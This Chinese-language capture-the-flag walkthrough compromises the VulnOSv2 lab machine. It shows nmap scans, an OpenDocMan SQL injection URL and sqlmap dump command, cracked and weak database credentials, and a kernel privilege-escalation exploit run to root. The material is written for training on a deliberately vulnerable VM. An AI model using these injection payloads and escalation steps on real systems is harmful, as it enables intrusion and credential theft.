### 端口扫描

```bash
# Nmap 7.94SVN scan initiated Sat Nov  9 00:32:39 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.56.104
Nmap scan report for 192.168.56.104
Host is up (0.012s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
MAC Address: 08:00:27:FD:AF:86 (Oracle VirtualBox virtual NIC)
```

```bash
# Nmap 7.94SVN scan initiated Sat Nov  9 00:33:57 2024 as: nmap -sT -sV -sC -O -p22,80,6667 -oN nmap_results/detils_scan 192.168.56.104
Nmap scan report for 192.168.56.104
Host is up (0.0017s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: VulnOSv2
|_http-server-header: Apache/2.4.7 (Ubuntu)
6667/tcp open  irc     ngircd
MAC Address: 08:00:27:FD:AF:86 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
nmap --script=vuln -p80,6667 -oN nmap_results/script_scan 192.168.56.104
```

### web端渗透

> http://192.168.56.104/jabc

这一段话是隐藏的，可以在源码中查看，`guest`用户可以登录

![image-20241109183017865](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241109183017865.png)

访问`/jabcd0cs`

```bash
┌──(root㉿kali)-[~/vulnhub/vulnosv2]
└─# whatweb http://192.168.56.104/jabcd0cs/              
http://192.168.56.104/jabcd0cs/ [200 OK] Apache[2.4.7], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.56.104], JQuery, OpenDocMan[1.2.7], PHP[5.5.9-1ubuntu4.14], PasswordField[frmpass], Script[text/javascript], Title[JABC-D0CS], X-Powered-By[PHP/5.5.9-1ubuntu4.14]
```

`openDocMan`DMS文档管理系统，版本1.2.7

```bash
searchsploit opendocman -m 32075
```

该版本有多个漏洞

> SQL Injection in OpenDocMan: CVE-2014-1945
>
> ```
> http://[host]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9
> ```

sqlmap

```bash
sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9" -D jabcd0cs -T odm_user -C username,password --dump
```

```
+----------+------------------------------------------+
| username | password                                 |
+----------+------------------------------------------+
| webmin   | b78aae356709f8c31118ea613980954b         |
| guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) |
+----------+------------------------------------------+
```

找个在线网站，爆破md5

`webmin1980`

拿到密码，网站可以登录上去，没找到利用点，然后就是SSH登录

### 系统立足点

```bash
ssh webmin@192.168.56.104
```

### 提权

查看`passwd`文件，发现有`postgres`用户，还有PostgreSQL数据库

> ```
> postgres:x:107:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
> ```

```
ss -ta
```

![image-20241109220517216](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241109220517216.png)

尝试弱密码`postgres:postgres`,成功登录

```postgresql
$ psql -h 127.0.0.1 -U postgres
Password for user postgres: 
psql (9.3.11)
SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
Type "help" for help.

postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 system    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =CTc/postgres        +
           |          |          |             |             | postgres=CTc/postgres
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(4 rows)

postgres=# \c system
SSL connection (cipher: DHE-RSA-AES256-GCM-SHA384, bits: 256)
You are now connected to database "system" as user "postgres".
system=# \d
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | users | table | postgres
(1 row)

system=# select * from users;
 ID |  username   |    password     
----+-------------+-----------------
  1 | vulnosadmin | c4nuh4ckm3tw1c3
(1 row)
```

拿到一对凭据`vulnosadmin:c4nuh4ckm3tw1c3`

```bash
vulnosadmin@VulnOSv2:~$ ls -la
total 476
drwxr-x--- 3 vulnosadmin vulnosadmin   4096 May  4  2016 .
drwxr-xr-x 4 root        root          4096 Apr 16  2016 ..
-rw------- 1 vulnosadmin vulnosadmin   4817 May  4  2016 .bash_history
-rw-r--r-- 1 vulnosadmin vulnosadmin    220 Apr  3  2016 .bash_logout
-rw-r--r-- 1 vulnosadmin vulnosadmin   3637 Apr  3  2016 .bashrc
drwx------ 2 vulnosadmin vulnosadmin   4096 Apr  3  2016 .cache
-rw-r--r-- 1 vulnosadmin vulnosadmin    675 Apr  3  2016 .profile
-rw-rw-r-- 1 vulnosadmin vulnosadmin 449100 May  4  2016 r00t.blend
-rw------- 1 root        root          1504 May  2  2016 .viminfo
```

发现`r00t.blend`文件，使用blend软件，隐藏掉图形后，发现在该文件发现密码 ：`ab12fg//drg`

成功登录root

### 内核提权

```bash
vulnosadmin@VulnOSv2:~$ uname -a
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
vulnosadmin@VulnOSv2:~$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@komainu) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014
vulnosadmin@VulnOSv2:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.4 LTS"
NAME="Ubuntu"
VERSION="14.04.4 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.4 LTS"
VERSION_ID="14.04"
```

内核版本`3.13.0`，系统版本`Ubuntu 14.04.4`

```bash
searchsploit linux kernel 3.13.0
```

`37292`符合，下载到靶机，编译

```bash
vulnosadmin@VulnOSv2:/tmp$ ./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(vulnosadmin)
# whoami
root
```

